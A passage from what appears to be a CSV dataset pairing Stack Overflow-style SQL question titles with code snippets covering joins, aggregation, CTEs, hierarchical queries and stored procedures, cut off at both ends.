                    FROM   dbo.Split(@FULL_NAME, ',')) 
"
24667,6731,joining and possible sub-queries,"SELECT * FROM blog_posts WHERE user_id in 
(SELECT friend_id FROM user_friend WHERE user_id=1)
"
28222,25300,SQL query to get distinct rows from multiple tables,"SELECT c.id, c.name 
FROM Company c
WHERE EXISTS
(SELECT 1
 FROM Branch b
 WHERE c.id = b.cid AND b.profit > 100)
"
36747,4897,django ORM : how to make an select query with OR between two fields,"Model.objects.filter(Q(field1=v1) | Q(field2=v2))
"
35013,33253,"SQL Join, not sure of exact syntax in complex query","SELECT DISTINCT i.id AS id
     , i.company AS company
     , i.insolvencyDate AS insolvency_date
     , i.city AS city
     , i.createdOn AS createdOn
     , 1 AS rank_id
     , t.entryCopy AS insolvency_type
     , i.businessNature AS business_nature
     , p.name AS pract_comp_name
     , 'I'     AS i_type 
  FROM insolvencies i
  LEFT JOIN practitioners p ON insolvencies.practitioner = practitioners.id
  CROSS JOIN lookupcopy t 
  WHERE i.checked   =  1    
    AND t.id     =  i.insolvencyType 
    AND i.insolvencyDate    >=  {ts '2010-01-22 00:00:00'} 
    AND i.insolvencyDate    <=  {ts '2011-10-20 00:00:00'} 
    AND (LOWER(p.name)   LIKE   '%Hodgsons%') 
GROUP BY id
"
39740,3595,Combine SQL Queries?,"DECLARE @City VARCHAR(100), @StateProv VARCHAR(100), @PostalCode VARCHAR(100)

SELECT @City = City_tx FROM City WHERE City_id = 11
SELECT @StateProv = StateProv_tx FROM StateProv WHERE StateProv_id = 12
SELECT @PostalCode = PostalCode_tx FROM PostalCode WHERE PostalCode_id = 13

SELECT @City City, @StateProv StateProv, @PostalCode PostalCode
"
29918,22158,MySQL CASE statements using dates,"SELECT
  id,
  CASE
    WHEN date_activated > '2011-11-23 18:30:00' THEN 'after'
    WHEN date_activated > '2010-01-20 00:00:00' THEN 'before'
    ELSE 'not yet'
  END AS date_note
FROM table1;
"
19998,56818,How to build a query that returns exactly n number of rows,"select level 
from dual 
connect by level <= 100
"
2038,1405,distinct and case within WHERE clause,"select unit_id, law_id, risk FROM                
            (select unit_id, law_id, a.risk, 
                     rank() OVER (PARTITION BY unit_id, law_id 
                                  ORDER BY CASE WHEN risk = 'Critical' then 1 else 0 end DESC, crr DESC, risk DESC ) as rank
            from (select unit_id, law_id, risk, count(risk) as crr
            from schema.table1 group by unit_id, law_id, risk
          order by crr desc, risk desc      
           ) a  )b WHERE rank = 1 
"
9964,10192,Trouble with database normalisation,"Table: Region
Cols: ID, RegionName, State, etc...

Table: NewsLetter
Cols: ID, NewsLetterName, ect...

Table: Map_Region_NewsLetter
Cols: ID, RegionID, NewsLetterID
"
26083,64816,Create a SQL Update Command Dynamically in a Web Service,"String MyConnStr =
        ConfigurationManager.ConnectionStrings[""MainConnStr""].ConnectionString;
using (SqlConnection connection = new SqlConnection(MyConnStr))
{
    using (SqlCommand Query = new SqlCommand())
    {
        try
        {
            Query.Connection = connection;
            String sql = ""UPDATE dbo.calendar_table SET id = @appointmentID"";
            // The has-field-been-updated-by-user logic below assumes the
            // fields are strings.  Different logic might be necessary
            // for other data types.
            if (!String.IsNullOrWhitespace(userInputTitle))
            {
                sql += "", title = @title"";
                Query.Parameters.AddWithValue(""@title"", userInputTitle);
            }
            if (!String.IsNullOrWhitespace(userInputType))
            {
                sql += "", type = @type"";
                Query.Parameters.AddWithValue(""@type"", userInputType);
            }
            if (!String.IsNullOrWhitespace(userInputNote))
            {
                sql += "", note = @note"";
                Query.Parameters.AddWithValue(""@note"", userInputNote);
            }
            // Additional fields...
            sql += "" WHERE (id = @appointmentID)"";
            Query.Parameters.AddWithValue(""@appointmentID"", appointmentID);
            Query.CommandText = sql;
            Query.CommandType = CommandType.Text;
            connection.Open();
            Query.ExecuteNonQuery();
        }
        catch (Exception ex)
        {
            Debug.WriteLine(ex);
        }
    }
}
"
3753,50907,How to get date difference statistics by group with TSQL,"DECLARE @DATA TABLE (Prod CHAR(1), SaleDate SMALLDATETIME)
INSERT INTO @DATA VALUES ('A','2013-02-05')
INSERT INTO @DATA VALUES ('D','2013-02-24')
INSERT INTO @DATA VALUES ('B','2013-03-01')
INSERT INTO @DATA VALUES ('A','2013-03-12')
INSERT INTO @DATA VALUES ('D','2013-03-22')
INSERT INTO @DATA VALUES ('A','2013-04-03')
INSERT INTO @DATA VALUES ('D','2013-04-08')


SELECT     
t.Prod
, MAX(t.Interval) IntervalMax
, MIN(t.Interval) IntervalMin
, AVG(t.Interval) IntervalAvg

FROM 
(
    SELECT t1.*, DATEDIFF(dd, MAX(t2.SaleDate), t1.SaleDate) Interval
    FROM @DATA t1
    LEFT OUTER JOIN @DATA t2 ON t1.Prod = t2.Prod AND t1.SaleDate > t2.SaleDate
    GROUP BY t1.Prod, t1.SaleDate
)t
GROUP BY t.Prod
ORDER BY t.Prod
"
24162,26423,get last number part of a String in PL/SQL,"create or replace function nextSerial(s in varchar2) return varchar2 as
  i integer;
  done boolean := false;
  c char;
  newserial varchar2(4000);
begin
  newserial := s;

  i := length(newserial);
  while i>0 and not done loop
    c := substr(newserial, i, 1);
    if c='9' then
      newserial := substr(newserial, 1, i-1) || '0' || substr(newserial, i+1);
    elsif c>='0' and c<='8' then
      c := chr(ascii(c)+1);
      newserial := substr(newserial, 1, i-1) || c || substr(newserial, i+1);
      done := true;
    end if;
    i := i-1;
  end loop;

  if not done then
    newserial := '1' || newserial;
  end if;

  return newserial;
end;
"
15827,63901,Tuple variables - Can someone explain to me the following SQL statement,"SELECT c2.first_name
FROM users c1, users c2
WHERE c1.address = c2.address
AND c1.first_name =  'John'
AND c2.first_name != 'John'
"
20520,4138,display monthly attendance report of an employee,"SELECT eid 'ID',empname 'Name', month(logindatetime) 'Month', count(*) 'Attendance'
FROM empattendancetable 
WHERE month(logindatetime)=@month
GROUP BY eid,empname, month(logindatetime)
"
14215,34020,MySQL JOIN ON with WHERE,"SELECT  *
FROM    albums
JOIN    artists
ON      artists.artist_id = albums.artist_id
WHERE   album_id = 101 
"
23248,21098,SQL column names and quotename,"DECLARE @columnName NVARCHAR(max)

set @columnName = Quotename('DW_ID')
-- @columnName is [DW_ID] now

print @columnName

IF (@columnName LIKE '[[]DW_%]')
   print 'system column'
else
   print 'non system column'
"
4756,70050,Get resultset from oracle stored procedure,"SQL> create procedure myproc (prc out sys_refcursor)
  2  is
  3  begin
  4     open prc for select * from emp;
  5  end;
  6  /

Procedure created.

SQL> var rc refcursor
SQL> execute myproc(:rc)

PL/SQL procedure successfully completed.

SQL> print rc

     EMPNO ENAME      JOB              MGR HIREDATE           SAL       COMM     DEPTNO
---------- ---------- --------- ---------- ----------- ---------- ---------- ----------
      7839 KING       PRESIDENT            17-NOV-1981       4999                    10
      7698 BLAKE      MANAGER         7839 01-MAY-1981       2849                    30
      7782 CLARKE     MANAGER         7839 09-JUN-1981       2449                    10
      7566 JONES      MANAGER         7839 02-APR-1981       2974                    20
      7788 SCOTT      ANALYST         7566 09-DEC-1982       2999                    20
      7902 FORD       ANALYST         7566 03-DEC-1981       2999                    20
      7369 SMITHY     CLERK           7902 17-DEC-1980       9988         11         20
      7499 ALLEN      SALESMAN        7698 20-FEB-1981       1599       3009         30
      7521 WARDS      SALESMAN        7698 22-FEB-1981       1249        551         30
      7654 MARTIN     SALESMAN        7698 28-SEP-1981       1249       1400         30
      7844 TURNER     SALESMAN        7698 08-SEP-1981       1499          0         30
      7876 ADAMS      CLERK           7788 12-JAN-1983       1099                    20
      7900 JAMES      CLERK           7698 03-DEC-1981        949                    30
      7934 MILLER     CLERK           7782 23-JAN-1982       1299                    10
      6668 Umberto    CLERK           7566 11-JUN-2009      19999          0         10
      9567 ALLBRIGHT  ANALYST         7788 02-JUN-2009      76999         24         10
"
13879,8034,MySQL: Getting duplicate values when connecting multiple tables,"select
    *
from
    patient
left join
    person on person.nummer = patient.nummer
left join
    vanster_implantat on vanster_implantat.nummer = patient.nummer
left join
    hoger_implantat on hoger_implantat.nummer = patient.nummer
left join
    vanster_operationer on vanster_operationer.nummer = patient.nummer
left join
    hoger_operationer on hoger_operationer.nummer = patient.nummer
left join
    vanster_processorpatient on vanster_processorpatient.nummer = patient.nummer
left join
    hoger_processorpatient on hoger_processorpatient.nummer = patient.nummer;
"
3259,61247,How to increase speed of SQL query from 2 CONNECT BY,"SELECT id, name, t3name FROM 
(SELECT distinct t1.id as id, 
                 t1.parent as parent, 
           t1.name as name, 
           t3.name as t3name
    FROM (select tt1.name, tt1.id, tt1.parent, connect_by_root(tt1.t2_id) t2_id
         from table1 tt1 
         START WITH tt1.id in (83, 98, 9, 19, 4, 101)
        CONNECT BY PRIOR tt1.parent = tt1.id) t1
    JOIN table2 t2
        ON t1.t2_id = t2.id
    JOIN table3 t3
        ON t2.t3_id = t3.id
    )
WHERE t3name IS NOT NULL
START WITH parent = 0
    CONNECT BY PRIOR id = parent and PRIOR t3name = t3name; 
"
30823,65767,How to select rows inside a CLR stored procedure in MS SQL Server 2008?,"using(SqlConnection connection = new SqlConnection(""context connection=true"")) 
{
    connection.Open();
    // Use the connection
}
"
5303,60267,Retrieving count and summing from many different tables with shared ID in SQL,"SELECT Prgm_ID, COUNT(ID) AS Subprgm_Count FROM (
    SELECT a.prgm_type_a_ID AS ID, Prgm_ID FROM TableA a UNION ALL
    SELECT b.prgm_type_b_ID, b.Prgm_ID FROM TableB b UNION ALL
    SELECT c.prgm_type_c_ID, c.Prgm_ID FROM TableC c
)t
GROUP BY Prgm_ID
HAVING COUNT(ID) >= 5 --Your limit here
"
39888,31162,Most efficient way to store IP Address in MySQL,"SELECT INET_ATON('127.0.0.1');

+------------------------+
| INET_ATON('127.0.0.1') |
+------------------------+
|             2130706433 | 
+------------------------+
1 row in set (0.00 sec)


SELECT INET_NTOA('2130706433');

+-------------------------+
| INET_NTOA('2130706433') |
+-------------------------+
| 127.0.0.1               | 
+-------------------------+
1 row in set (0.02 sec)
"
14464,37974,SQL IN - Variable inside of table column?,"where d = <cfqueryparam cfsqltype=""cf_sql_varchar"" value=""#c#""> 
--- c is only element
or d like <cfqueryparam cfsqltype=""cf_sql_varchar"" value=""#c#,%""> 
--- c is first element
or d like <cfqueryparam cfsqltype=""cf_sql_varchar"" value=""%,#c#,%""> 
--- c is in the middle somewere
or d like <cfqueryparam cfsqltype=""cf_sql_varchar"" value=""%,#c#""> 
--- c is last element
"
19999,42593,How to use double GROUP BY correctly,"select p.gender, count(*) number_of_multilanguage_people
from (SELECT name
      FROM Known_Languages
      GROUP BY name
      HAVING COUNT(*) > 1) t 
join People p on p.name = t.name
group by p.gender
"
9716,43569,SQL Count total number of rows whilst using LIMIT,"$sql .= ""posts p, images im, postimages pi WHERE
    i.active = 1 
    AND pi.post_id = p.id
    AND pi.image_id = im.image_id 
    ORDER BY created_at 
    LIMIT "". ($page - 1) * $pagesize ."", "". $pagesize;
"
32828,64513,Unable to add DOUBLE and VARCHAR columns with CAST(),"SELECT CONCAT_WS("""", ""$"", FORMAT(COALESCE(db.billing.cost_per_month, 0.00), 2)) AS ""Monthly Cost"",
  CONCAT_WS("""", ""$"", FORMAT(COALESCE(db.billing.additional_cost, 0.00),  2)) AS ""Additional Cost"",
  CONCAT_WS("""", ""$"", FORMAT(COALESCE(db.billing.cost_per_month, 0.00) AS DECIMAL(60, 2)) + COALESCE(db.billing.additional_cost, 0.00), 2)) AS ""Total Cost""
  FROM db.billing;
"
24699,67068,My NOT EXISTS is not turning out like it is supposed to,"Select title AS 'Book Title'
From titles
WHERE NOT EXISTS
(Select ord_num
    From sales
    Where titles.title_id = sales.title_id)
"
12195,43193,Oracle get rows that exactly matches the list of values,"SELECT OrderID 
FROM OrderDetailTable JOIN OrderedTable USING (ItemID)
GROUP BY OrderID 
HAVING COUNT(DISTINCT ItemID) = (SELECT COUNT(DISTINCT ItemID) FROM OrderedTable)
"
22073,9793,Calculation and multiple joins in mysql,"SELECT
  p.productid,

  (ifnull(g.g_sum,0) + ifnull(rq.rq_sum,0))-(ifnull(i.i_sum,0) + ifnull(ro.ro_sum,0)) as StockBalance,

  ifnull(g.g_sum,0) as GRN_QUANTITY,
 ifnull( rq.rq_sum,0) as RETURN_IN_QUANTITY,
 ifnull( i.i_sum,0) as INVENTORY_QUANTITY,
 ifnull( ro.ro_sum,0) as RETURN_OUT_QUANTITY
from products as p
  left join (select
           productid,
           sum(grnqty)  as g_sum
         from grnqty group by productid) as g
    on g.productid = p.productid
  left join (select
           productid,
           sum(retinqty) as rq_sum
         from returninqty group by productid) as rq
    on rq.productid = p.productid
  left join (select
           productid,
           sum(invqty)  as i_sum
         from invoiceqty group by productid) as i
    on i.productid = p.productid
  left join (select
           productid,
           sum(retoutqty) as ro_sum
         from returnoutqty group by productid) as ro
    on ro.productid = p.productid
"
26151,22462,Index in query plan is skipped when using OR condition in Postgres,"SELECT *
FROM my_table
WHERE kind = 'type1'
UNION ALL
SELECT *
FROM my_table
WHERE kind IS NULL;
"
19095,40110,removing duplicates record from a populated field,"-- create temp table with numbers
    ;WITH r AS (
        SELECT 1 AS n
        UNION ALL
        SELECT n+1 FROM r WHERE n+1<=10000
    )
    SELECT n, ROW_NUMBER() OVER( ORDER BY NEWID()) random INTO #tempnums FROM r
    OPTION (Maxrecursion 0)

-- update 

    UPDATE x SET ALTATH=t.random
    FROM (SELECT *, ROW_NUMBER() OVER(ORDER BY ALTATH) rown FROM APRFIL) x 
    JOIN #tempnums t ON t.n=x.rown
"
25944,49230,How to sum sales by months and compare them,"  SELECT DATEPART(Year, DATELASTFULFILLMENT) AS [Year], 
         DATEPART(Month, DATELASTFULFILLMENT) AS [Month], 
         SUM(TOTALPRICE) AS Total
    FROM SOITEM
GROUP BY DATEPART(Year, DATELASTFULFILLMENT), DATEPART(Month, DATELASTFULFILLMENT)
ORDER BY [Year], [Month]
"
1243,57696,Join with select SQL query?,"LEFT JOIN (
    SELECT derby_postmeta.post_id  AS dbID1, 
           derby_postmeta.meta_key AS dbMeta1
    FROM someTable
) dpm ON pid = dpm.dbid1 AND dpm.dbmeta1 = 'twitter'
"
7738,12453,Compress DB by removing unused PRIMARY KEY AUTOINCREMENTAL INTEGER,"sqlite> create table testtable(idx INTEGER PRIMARY KEY AUTOINCREMENT, foo varchar(100), bar varchar(100));
sqlite> insert into testtable (foo, bar) values ('a', 'b');
sqlite> insert into testtable (foo, bar) values ('c', 'd');
sqlite> insert into testtable (foo, bar) values ('e', 'd');
sqlite> insert into testtable (foo, bar) values ('g', 'g');
sqlite> select * from testtable;
1|a|b
2|c|d
3|e|d
4|g|g
sqlite> delete from testtable where idx = 2;
sqlite> select * from testtable;
1|a|b
3|e|d
4|g|g
sqlite> insert into testtable (foo, bar) values ('h', 'i');
sqlite> select * from testtable;
1|a|b
3|e|d
4|g|g
5|h|i
sqlite> insert into testtable (idx, foo, bar) values (2, 'j', 'k');
sqlite> select * from testtable;
1|a|b
2|j|k
3|e|d
4|g|g
5|h|i
sqlite>
"
30048,1691,Finding multiple attribute from GROUP BY function in a Query,"select movie_id, count(*) cnt 
from review 
Group by movie_id 
Having count(*)>1
order by cnt desc
"
31922,26817,Converting YYYYMM format to YYYY-MM-DD in SQL Server,"create procedure dbo.getDataForMonth

  @yyyymm char(6) = null

as

  --
  -- use the current year/month if the year or month is invalid was omitted
  -- 
  set @yyyymm = case coalesce(@yyyymm,'')
                when '' then convert(char(6),current_timestamp,112)
                else         @yyyymm
                end

  --
  -- this should throw an exception if the date is invalid
  --
  declare @dtFrom date = convert(date,@yyyymm+'01') -- 1st of specified month
  declare @dtThru date = dateadd(month,1,@dtFrom)   -- 1st of next month

  --
  -- your Big Ugly Query Here
  --
  select *
  from dbo.some_table t
  where t.date_of_record >= @dtFrom
    and t.date_of_record < @dtThru

  --
  -- That's about all there is to it.
  --
  return 0
go
"
9610,46830,Calculation in query based on the condition,"SELECT C.costomerId,
       C.costomerName,
       C.coustomerPhone,
       O.price,
       CASE X_flag 
          WHEN 1 THEN (.5 * O.total_count) + (.3 * O.total_amount) 
          ELSE 7 * O.total_count) + (.4 * O.total_amount)
       END as fee
FROM cusromers C
join orders O
  on C.orderId = O.orderID     
"
28965,73783,Summing historic cost rates over booked time (single effective date),"IF OBJECT_ID ('tempdb..#ResourceTimeTypeCost') IS NOT NULL DROP TABLE #ResourceTimeTypeCost
CREATE TABLE #ResourceTimeTypeCost (  ResourceCode VARCHAR(32),  TimeTypeCode VARCHAR(32),  EffectiveDate DATETIME,  CostRate DECIMAL(12,2) ) 
INSERT INTO #ResourceTimeTypeCost 
SELECT 'ResourceA' as resourcecode, 'Normal' as timetypecode, '2012-04-30' as effectivedate, 40.00 as costrate
UNION ALL
SELECT 'ResourceA', 'Normal', '2012-05-04', 50.00

IF OBJECT_ID ('tempdb..#TimeEntered') IS NOT NULL DROP TABLE #TimeEntered
CREATE TABLE #TimeEntered (  ResourceCode VARCHAR(32),  TimeTypeCode VARCHAR(32),  ProjectCode VARCHAR(32),  ActivityCode VARCHAR(32),  TimeEnteredDate DATETIME,  HoursWorked DECIMAL(12,2) ) 
INSERT INTO #TimeEntered 
SELECT 'ResourceA','Normal','Project1','Management1','2012-04-30',7.5 
UNION ALL SELECT 'ResourceA','Normal','Project1','Management1','2012-05-01',7.5 
UNION ALL SELECT 'ResourceA','Normal','Project1','Management1','2012-05-02',7.5 
UNION ALL SELECT 'ResourceA','Normal','Project1','Management1','2012-05-03',7.5 
UNION ALL SELECT 'ResourceA','Normal','Project1','Management1','2012-05-04',7.5 
UNION ALL SELECT 'ResourceA','Normal','Project1','Management1','2012-05-07',7.5 
UNION ALL SELECT 'ResourceA','Normal','Project1','Management1','2012-05-08',7.5 

;with ranges as
(
select 
resourcecode 
,TimeTypeCode
,EffectiveDate
,costrate
,row_number() OVER (PARTITION BY resourcecode,timetypecode ORDER BY effectivedate ASC) as row
from #ResourceTimeTypeCost 
)
,ranges2 AS
(
SELECT 
r1.resourcecode 
,r1.TimeTypeCode
,r1.EffectiveDate
,r1.costrate
,r1.effectivedate as start_date
,ISNULL(DATEADD(ms,-3,r2.effectivedate),GETDATE()) as end_date
FROM ranges r1
LEFT OUTER JOIN ranges r2 on r2.row = r1.row + 1 --joins onto the next date row
                    AND r2.resourcecode = r1.resourcecode 
                    AND r2.TimeTypeCode = r1.TimeTypeCode
)
SELECT 
tee.resourcecode
,tee.timetypecode
,tee.projectcode
,tee.activitycode
,SUM(ranges2.costrate * tee.hoursworked) as total_cost
FROM #TimeEntered tee
INNER JOIN ranges2 ON tee.TimeEnteredDate >= ranges2.start_date
                    AND tee.TimeEnteredDate <= ranges2.end_date
                    AND tee.resourcecode = ranges2.resourcecode
                    AND tee.timetypecode = ranges2.TimeTypeCode
GROUP BY tee.resourcecode
,tee.timetypecode
,tee.projectcode
,tee.activitycode
"
36884,71052,performing select count across two tables sql,"select c.*, cc.relativecount
from client c
inner join (
    select clientid, count(*) as relativecount  
    from client_relative
    group by clientid 
) cc on c.clientid = cc.clientid
"
449,44661,Dropping XMLIndex group and parameters,"    select index_name, parameters from user_xml_indexes;


    <parameters>
      <structured>
        <group name=""YYY"">
          <xmltab name=""TABLE_NAME""> &apos;&apos;/entity/year&apos;&apos; columns &quot;year&quot; integer  PATH &apos;&apos;text()&apos;&apos; </xmltab>
        </group>
     </structured>
    </parameters>
"
28332,67837,Create column that stores hierarchy as comma separated values,"WITH data (unit, m_unit) AS (
    SELECT 10, 12 FROM dual UNION ALL
    SELECT 15, 19 FROM dual UNION ALL
    SELECT 12, 16 FROM dual UNION ALL
    SELECT 13, 15 FROM dual UNION ALL
    SELECT 19, 14 FROM dual UNION ALL
    SELECT 14, 11 FROM dual)
SELECT
    unit,
    m_unit,
    unit || ',' || listagg(root_unit, ',') WITHIN GROUP (ORDER BY depth) h_tree
FROM (
    SELECT
        id, unit, m_unit,
        LEVEL depth, CONNECT_BY_ROOT m_unit root_unit
    FROM
        (SELECT ROWNUM id, unit, m_unit FROM data) data
    CONNECT BY
        PRIOR unit = m_unit)
GROUP BY
    id,
    unit,
    m_unit
"
12239,69588,How to compute percentage using SQL(postgresql)?,"SELECT COUNT(zipcode) as numberAbove
  FROM (SELECT
            zipcode 
        FROM
            crime
        WHERE
            activitydate >= '<START DATE>'
        AND
            activitydate < '<END DATE>'
        GROUP BY
            zipcode
        HAVING
            COUNT(zipcode) > (select COUNT(zipcode) 
                               from crime 
                               where zipcode = '<ZIP CODE TO USE>'
                               and activitydate >= '<START DATE>'
                               and activitydate < '<END DATE>' )) subq;
"
8276,29371,ORA-00904: invalid identifier when using natural join in the from clause combined with inner joins in subquery,"   SELECT d.department_name, x.city
   FROM  departments d
   NATURAL JOIN (SELECT l.location_id,l.city,l.country_id
                  FROM       locations l // <-- ""l"" has no scope outside brackets
                  INNER JOIN countries c
                  ON (l.country_id = c.country_id)
                  INNER JOIN regions r
                  ON (c.region_id = r.region_id)
                  WHERE r.region_name = 'Europe') x;
"
23305,68781,oracle - How to insert unique values from a table to another multiple times?,"insert into t(pk)
    select pk
    from table t2 cross join
         (select 1 as n from dual union all select 2 from dual union all select 3 from dual
         ) n;
"
20848,64688,calculate min and max functions,"select  min(case when j.Exempt_Non_Exempt_Status = 1 then e.Wage end)
,       max(case when j.Exempt_Non_Exempt_Status = 0 then e.Wage end)
from    Employee e
join    Job_title j
on      j.Job_title = e.Job_title
"
7500,21870,mysql is array in multiple columns,"WHERE (   FIND_IN_SET(events.name, mysql_real_escape_string($string)) > 0
       OR FIND_IN_SET(events.cities, mysql_real_escape_string($string)) > 0
       OR FIND_IN_SET(events.counties, mysql_real_escape_string($string)) > 0)
"
30247,20695,Get a record position in a group + record count of the group on each record,"WITH CTE AS
(
  SELECT GroupId, Item
  , GroupCount = COUNT(GroupID) OVER (PARTITION BY GroupID)
  , Pos = ROW_NUMBER() OVER (Partition By GroupID Order By GroupId)
  FROM #Data
)
SELECT GroupID, Item, Pos, GroupCount 
FROM CTE
"
37613,55302,How to get Nth big item,"WITH AgeOrderedPersons AS (
    SELECT usr.*
          ,ROW_NUMBER() OVER (ORDER BY Age) AS Number
    FROM Users usr
)
SELECT *
FROM AgeOrderedPersons
WHERE Number = 11
"
39061,13159,Correct escaping for Where clause in dynamic procedure,"SET @sql = ...
'WHERE @selection = ''closed'' ' +
'      AND (R.logStatus LIKE ''%Completed%'' ' +
'           OR R.logStatus LIKE ''%Closed%'') ' +
'      AND ( ' +
'            (@searchCategoryText <> ''dateRec'' ' +
'             AND R.@searchCategoryColumn LIKE ''%'' + @searchTerm + ''%'' ' +
'            ) ' +
'            OR ' +
'            (@searchCategoryText = ''dateRec'' ' +
'             AND CAST(R.dateRec AS DATE) LIKE ''%'' + @searchTerm + ''%'' ' +
'            ) ' +
'          ) ';

SET @sql = REPLACE(@sql, '@selection', QUOTENAME(@selection, ''''));
SET @sql = REPLACE(@sql, '@searchCategoryText', QUOTENAME(@searchcategory, ''''));  
SET @sql = REPLACE(@sql, '@searchCategoryColumn', QUOTENAME(@searchcategory)); 
SET @sql = REPLACE(@sql, '@searchTerm', QUOTENAME(@searchTerm, ''''));
"
11908,47044,MDX - Count of Filtered CROSSJOIN - Performance Issues,"CREATE MEMBER CURRENTCUBE.[Measures].[Num Stores In-Stock]
AS COUNT(
    CROSSJOIN(
        DESCENDANTS(
            [Product].[Item].CURRENTMEMBER,
            [Product].[Item].[UPC]        
        ),
        DESCENDANTS(
            [Division].[Store].CURRENTMEMBER,
            [Division].[Store].[Store ID]       
        ),
        { [Flag dim].[cond].[cond: yes] }

    )
)
"
21293,16191,Group by and Order by in the same select,"SELECT MODELLI.MOD_DESC, COUNT(MODELLI.MOD_DESC)
FROM VEGA.DISTRIB DISTRIB, VEGA.MODELLI MODELLI
WHERE DISTRIB.DIS_FLAG = 'M' AND DISTRIB.DIS_MOD = MODELLI.MOD_COD
GROUP BY MODELLI.MOD_DESC ORDER BY MODELLI.MOD_DESC
"
2901,9249,Setting up a parameter around a timestamp on db2,"SELECT *
  FROM LIST_CHECKIN_AUDIT 
 WHERE DOCUMENT_TYPE = 'DABL'
   AND (DAYOFWEEK(CHECKIN_DATE) <= 2 AND HOUR(CHECKIN_DATE) <= '9'))
    OR (DAYOFWEEK(CHECKIN_DATE) >= 3 AND HOUR(CHECKIN_DATE) >= '7'))
"
19609,30220,Mysql query to count number of days of login,"UPDATE users SET 
number_of_days = if (last_login = curdate(), number_of_days, number_of_days + 1),
last_login='date', number_of_login = number_of_login + 1
WHERE user_id='user_id'
"
20975,62593,delete from 3 tables with one query,"delete 
    relativedata, crawls, stored
from
    relativedata 
LEFT join crawls on relativedata.crawl_id = crawls.id
LEFT join stored on relativedata.crawl_id = stored.crawl_id
WHERE
    relativedata.id = ? 
"
37194,12722,Finding date between start date and end date,"WHERE datepaid BETWEEN '2010-04-01 00:00:00' AND '2010-04-15 23:59:59'
"
12924,34193,SQL Server correct way to account for the weekend,"select * from table where date = (case
  when datename(dw, getdate()) = 'Friday' then
    convert(varchar, dateadd(day, 7, DATEADD(dd, 0, DATEDIFF(dd, 0,getdate()))), 103)
     + ',' + convert(varchar, dateadd(day, 9, DATEADD(dd, 0, DATEDIFF(dd, 0,getdate()))), 103)
  else
    convert(varchar, dateadd(day, 7, DATEADD(dd, 0, DATEDIFF(dd, 0,getdate()))), 103)
  end)
"
39347,52177,logic for handling tie with aggregate,"SELECT  src.[id], src.[type], src.[percent]
FROM (
    SELECT  [id], [type], [percent], 
            ROW_NUMBER() OVER(PARTITION BY h.[id] ORDER BY [percent] DESC, h.[type] ASC) AS RowNum
    FROM    [highest] h
) src
WHERE src.RowNum = 1
"
36443,70706,sqlplus remove \r \n \t from spool,"SELECT TRANSLATE(L,'A'||CHR(10)||CHR(9)||CHR(13),'A') FROM test;
"
16257,38511,Group By clause not showing the same row values?,"SELECT
  g.filename1,
  data.filename2,
  g.hd
FROM
  data
    INNER JOIN
      (SELECT 
        filename1, 
        min(hd) AS hd 
      FROM 
        data 
      GROUP BY 
        filename1) AS g
      ON data.filename1=g.filename1
      AND data.hd=g.hd
ORDER BY g.hd ASC
"
32125,47925,Max From Select,"Create proc [dbo].[SpGetPharmacyLogpast]
AS
SELECT  TOP 1 Pharmacylog.PharmcyItemID,Pharmacylog.PastQuantity,Pharmacylog.NowQuantity,Pharmacylog.Amount,Pharmacylog.TotalValue,PharmacyItems.ID  
from Pharmacylog 
LEFT JOIN PharmacyItems
ON  PharmacyItems.ID=Pharmacylog.PharmcyItemID 
where PharmacyItems.ItemID=8
ORDER BY Pharmacylog.PharmcyItemID DESC 
RETURN
"
25477,702,Splitting a variable length column in SQL server safely,"declare @infotable table (info varchar(4000))
insert into @infotable
select 'IrrelevantID=666,UserID=123124,AnotherIrrelevantID=1232342,ItemID=1213124.'
union all 
select 'UserID=1123456,ItemID=6685642'

-- convert info column to xml type
; with cte as
(
    select cast('<info ' + REPLACE(REPLACE(REPLACE(info,',', '"" '),'=','=""'),'.','') + '"" />' as XML) info,
    ROW_NUMBER() over (order by info) id
    from @infotable
)
select userId, ItemId from 
(

       select T.N.value('local-name(.)', 'varchar(max)') as Name,
       T.N.value('.', 'varchar(max)') as Value, id
       from cte cross apply info.nodes('//@*') as T(N)
) v
pivot (max(value) for Name in ([UserID], [ItemId])) p
"
27094,52199,Generating a histogram from column values in a database,"SELECT COUNT(grade) FROM table GROUP BY grade ORDER BY grade
"
9735,19844,SQL query to get data in a table that starts with some specific row for ios app,"select * from tbl where ListId = 5 order by WordId <> 58
"
15331,73881,Operate pairs from 2 tables in SQL,"UPDATE B
SET COLOR = M.COLOUR
FROM CITY_BUILDS C  -- get city
-- get main
INNER JOIN BUILD M ON M.ID = C.IDBUILD AND M.IS_MAIN =1
 -- get others join them to city and main district
INNER JOIN BUILD B ON C.ID = C.IDBUILD AND C.IS_MAIN <> 1 AND M.DISTRICT = B.DISTRICT 
-- if you really only need one city then uncomment following 
--WHERE C.IDCITY = 142
"
35228,48680,sql left join +one to many relationship," SELECT c.uid, n.uid, n.nid, c.message  
 FROM node n  
   LEFT JOIN share_content c 
      ON c.nid = n.nid  
          And c.auto_id
             = (Select Max(auto_id)
                From share_content 
                Where nid = p.nid ) 
 Where n.nid = 40513  
 ORDER BY c.auto_id
"
37662,46009,Create a trigger to insert records from a table to another one. Get inserted values in a trigger,"CREATE TRIGGER trigger_UpdateItemDetails ON tbl_PurchaseDetails
FOR INSERT AS
BEGIN

    INSERT INTO 
    tbl_ItemDetails
    (
        PurchaseID,
        Quantity,
        WarehouseID
    )
    SELECT 
        PurchaseID, 
        ItemQuantity, 
        WarehouseID
    FROM 
        INSERTED
END
"
30888,24049,MySQL query for alphabetical search,"SELECT * FROM `test_tbl` WHERE cus_name REGEXP '^[abc]';
"
1383,72995,Fetching value from Pipe-delimited String using Regex (Oracle),"SQL> with t(id, text) as (
     select 1, 'asd|dfg|obr|1|value1|end'      from dual
     union
     select 2, 'a|brx|123|obr|2|value2|end'    from dual
     union
     select 3, 'hfv|obr|3|value3|345|pre|end'  from dual
     union
     select 4, 'hfv|obr||value4|345|pre|end'   from dual
     union
     select 5, 'a|brx|123|obriem|2|value5|end' from dual
     union
     select 6, 'a|brx|123|obriem|2|value6|obr' from dual
   )
   select
     id,
     nvl(regexp_substr(text, '\|obr\|[^|]*\|([^|]*)(\||$)', 1, 1, null, 1), 'value not found') value
   from t;

        ID VALUE
---------- -----------------------------
         1 value1
         2 value2
         3 value3
         4 value4
         5 value not found
         6 value not found

6 rows selected.

SQL>
"
8670,42192,Ordering a varchar column in MySQL in an Excel-like manner,"SELECT a FROM test ORDER BY a IS NULL OR a='', a<>'0' AND a=0, a+0, a;
"
18330,54413,SQL Inner Join : DB stuck,"SELECT 
op.orders_id, 
p.products_id, 
op.products_name, 
op.products_price, 
op.products_quantity 
